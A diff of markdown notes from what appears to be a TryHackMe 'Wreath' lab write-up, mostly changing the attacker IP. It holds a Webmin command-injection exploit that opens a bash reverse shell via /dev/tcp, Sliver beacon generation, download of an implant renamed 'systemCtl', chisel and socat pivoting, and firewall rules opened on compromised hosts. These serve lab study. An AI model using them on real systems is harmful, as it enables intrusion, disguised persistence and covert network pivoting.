@@ -31,7 +31,7 @@ Beyond Root:
 - BestInSlot CS for myself for copy and paste
 
 - [[Wreath-Notes.md]]
-- [[Wreath-CMD-by-CMDs.md]]
+- [[Wreath-CMD-by-CMDs-Original]]
 - [[Wreath-Penetration-Test-Report]]
 
 ## Introduction
@@ -126,7 +126,7 @@ upx WIDE-EYED_TRAM
 
 So we do need to worry about python virtual environments for compatibility
 ```bash
-curl  -k https://10.200.96.200:10000/password_change.cgi -d 'user=gotroot&pam=&expired=2|echo ""; bash -i >& /dev/tcp/10.50.76.121/10000 0>&1' -H 'Referer: https://10.200.96.200:10000/session_login.cgi'
+curl  -k https://10.200.96.200:10000/password_change.cgi -d 'user=gotroot&pam=&expired=2|echo ""; bash -i >& /dev/tcp/10.250.180.2/9999 0>&1' -H 'Referer: https://10.200.96.200:10000/session_login.cgi'
 ```
 
 [Muirland also has provided an exploit to use](https://github.com/MuirlandOracle/CVE-2019-15107) - a better way to do this would be to create a virtual environment
@@ -305,15 +305,15 @@ You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward
 ## On to the Git Server
 I decided to prep my  Sliver and pivoting with chisel
 ```bash
-generate beacon --http 10.50.85.217:2222 --arch amd64 --os linux --save /home/kali/Wreath/
-http -L 10.50.85.217 -l 2222
+generate beacon --http 10.250.180.2:2222 --arch amd64 --os linux --save /home/kali/Wreath/
+http -L 10.250.180.2 -l 2222
 
-curl http://10.50.85.217/chisel -o chisel
-curl http://10.50.85.217/SILVER -o systemCtl
+curl http://10.250.180.2/chisel -o chisel
+curl http://10.250.180.2/SILVER -o systemCtl
 
 
-sudo ./chisel server -hosts 10.50.85.217 --reverse -socks 10000
-nohup ./chisel client -v 10.50.85.217:10000 R:10001:socks &
+sudo ./chisel server -hosts 10.250.180.2 --reverse -socks 10000
+nohup ./chisel client -v 10.250.180.2:10000 R:10001:socks &
 # modify /etc/proxychains4.conf socks5 127.0.0.1 10001
 ```
 
@@ -701,7 +701,7 @@ Nevermind I tried atleast I will look into why further and I am sure there is a 
 
 ```bash
 # Prod
-nohup ./chisel client -v 10.50.85.217:10000 10004:10.200.84.200:10004:socks &
+nohup ./chisel client -v 10.250.180.2:10000 10004:10.200.84.200:10004:socks &
 firewall-cmd --zone=public --add-port 10004/tcp
 ```
 
@@ -737,7 +737,7 @@ Basically tmux pane pains. This becomes:
 
 ```bash
 # Kali
-./chisel server -host 10.50.85.217 --reverse --socks5 -p 10000 --auth 
+./chisel server -host 10.250.180.2 --reverse --socks5 -p 10000 --auth 
 
 client -v 127.0.0.1:10011 socks
 
@@ -746,8 +746,8 @@ echo "socks5 127.0.0.1 10001" | sudo tee -a /etc/proxychains4.conf
 # sed -i 's/socks5 127.0.0.1 10002/# socks5 127.0.0.1 10002/g' /etc/proxychains4.conf
 
 # Prod
-nohup ./chisel client -v 10.50.85.217:10000 R:10001:socks &
-nohup ./chisel client -v 10.50.85.217:10000 R:127.0.0.1:10002:10.200.84.150:80 &
+nohup ./chisel client -v 10.250.180.2:10000 R:10001:socks &
+nohup ./chisel client -v 10.250.180.2:10000 R:127.0.0.1:10002:10.200.84.150:80 &
 ## Prod Second shell
 ./chisel server -host 10.200.84.200 -p 11000 --reverse --sock5
 # Git
@@ -764,7 +764,7 @@ netsh advfirewall firewall add rule name="nvm-chisel-PC-serverout" dir=out actio
 start-job { chisel.exe client -v 10.200.84.200:11000 R:11001:socks }
 
 
-nohup ./chisel client -v 10.50.85.217:10000 R:10004:127.0.0.1:11000 &
+nohup ./chisel client -v 10.250.180.2:10000 R:10004:127.0.0.1:11000 &
 
 
 ```
@@ -777,7 +777,7 @@ nohup ./chisel client -v 10.50.85.217:10000 R:10004:127.0.0.1:11000 &
 
 
 # Kali
-./chisel server -host 10.50.85.217 --reverse --socks5 -p 10000 
+./chisel server -host 10.250.180.2 --reverse --socks5 -p 10000 
 # Reverse proxys -> server on Box1
 ./chisel client -v 10.200.84.200:11000 :socks # $Kaliclient_pivot_toBox2
 ./chisel client -v 10.200.84.200:11000 R:12001:socks # $Kaliclient_pivot_toBox3
@@ -789,7 +789,7 @@ chisel client <.200-machine-ip>:<chisel-server-port> <local-port>:<.150-machine-
 # Box1 <-> Kali
 ## Box1 server for pivoting from Box 2 - second shell
 ./chisel server -host 10.200.84.200 --reverse --socks5 -p 11000
-nohup ./chisel client -v 10.50.85.217:10000 10001:socks
+nohup ./chisel client -v 10.250.180.2:10000 10001:socks
 
 
 # Box2
@@ -804,12 +804,12 @@ start-job { C:\users\nvm\Documents\chisel.exe client 10.200.84.200:11000 R:11001
 
 
 # Connect back to the server on kali through $Kaliclient -v on 127.0.0.1:10011
-nohup ./chisel client -v 10.50.85.217:10000 R:10011:127.0.0.1:11000 &
+nohup ./chisel client -v 10.250.180.2:10000 R:10011:127.0.0.1:11000 &
 
 # Box2 -> Box 1 -> Kali
 # Box1
 nohup ./chisel client -v 127.0.0.1:11012 socks & # $Box1client
-nohup ./chisel client -v 10.50.85.217:10000 R:10011:127.0.0.1:11011 & # $Kaliclient_pivottoBox3
+nohup ./chisel client -v 10.250.180.2:10000 R:10011:127.0.0.1:11011 & # $Kaliclient_pivottoBox3
 # Box 2
 ./chisel server -host 10.200.84.150 --reverse --socks5 -p 12000 
 # Connect back to the server on Box 1 through $Box1client -v on 127.0.0.1:11012
@@ -835,7 +835,7 @@ generate beacon --http 10.200.84.200:11002 --arch amd64 --os windows --save /hom
 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
 
 # Socat Relay for Sliver till I learn to pivot like an APT from 2010
-nohup ./socat tcp-l:11002 tcp:10.50.85.217:11002 &
+nohup ./socat tcp-l:11002 tcp:10.250.180.2:11002 &
 
 netsh advfirewall firewall add rule name="nvm-chisel-clientin" dir=in action=allow protocol=tcp localport=11002
 netsh advfirewall firewall add rule name="nvm-chisel-clientout" dir=out action=allow protocol=tcp localport=11002
@@ -878,7 +878,7 @@ The lack of `-host` flag and my brain wanting to check the chisel -v output
 
 Kali
 ```bash
-./chisel server -v --host 10.50.85.217 --reverse -p 10000
+./chisel server -v --host 10.250.180.2 --reverse -p 10000
 # Kali -> box1 socks - socks client 
 ./chisel client -v 127.0.0.1:10010 10011:socks
 # 
@@ -891,10 +891,10 @@ Box 1
 #
 ./chisel server -v --host 10.200.84.200 --socks5 -p 11000
 # Kali -> box1 socks - reverse client 
-nohup ./chisel client 10.50.85.217:10000 R:10010:10.200.84.200:11000 & 
+nohup ./chisel client 10.250.180.2:10000 R:10010:10.200.84.200:11000 & 
 
 # Kali -> box1  - box2 socks
-nohup ./chisel client 10.50.85.217:10000 R:10020:127.0.0.1:10.200.84.150:12001 &
+nohup ./chisel client 10.250.180.2:10000 R:10020:127.0.0.1:10.200.84.150:12001 &
 ```
 
 Box 2
